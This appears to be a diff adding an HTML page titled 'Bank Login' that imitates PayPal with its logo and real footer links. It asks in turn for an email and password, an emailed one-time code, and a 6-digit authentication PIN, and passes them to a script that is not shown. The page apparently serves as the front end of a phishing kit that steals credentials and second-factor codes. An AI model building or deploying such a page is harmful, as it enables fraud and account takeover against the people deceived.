@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- 12lomzyposh -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Login</title>
+    <link rel="stylesheet" href="pay.css">
+</head>
+<body>
+    <div id="login-form">
+        <img src="/image/paypal-3384015_1280.webp" alt="Logo" style="width: 100px">
+        <form id="loginForm">
+            <input type="email" id="email" name="email" required placeholder="Email or mobile number">
+            <input type="text" id="password" name="password" required placeholder="Enter your password">
+            <button type="submit">Next</button>
+        </form>
+    </div>
+
+    <div id="otp-form" style="display: none;">
+        <img src="/image/paypal-3384015_1280.webp" alt="Logo" style="width: 100px;">
+        <h2>An OTP has been sent to the given email if it exists</h2>
+        <form id="otpForm">
+            <input type="text" id="otp" name="otp" required placeholder="OTP" class="finput">
+            <button type="submit">Verify OTP</button>
+        </form>
+    </div>
+
+    <div id="ath-form" style="display: none;">
+        <img src="/image/paypal-3384015_1280.webp" alt="Logo" style="width: 100px;">
+        <h2>Enter your 6-digit Authentication Pin</h2>
+        <form id="athForm">
+            <input type="text" id="ath" name="ath" required placeholder="Authentication Code">
+            <button type="submit">Verify Authentication Code</button>
+        </form>
+    </div>
+
+    <footer>
+        <ul>
+            <li><a href="https://www.paypal.com/us/smarthelp/contact-us">Contact Us</a></li>
+            <li><a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full">Privacy</a></li>
+            <li><a href="https://www.paypal.com/us/webapps/mpp/ua/legalhub-full">Legal Policy Updates</a></li>
+            <li><a href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a></li>
+        </ul>
+    </footer>
+    <script src="script.js"></script>
+</body>
+</html>
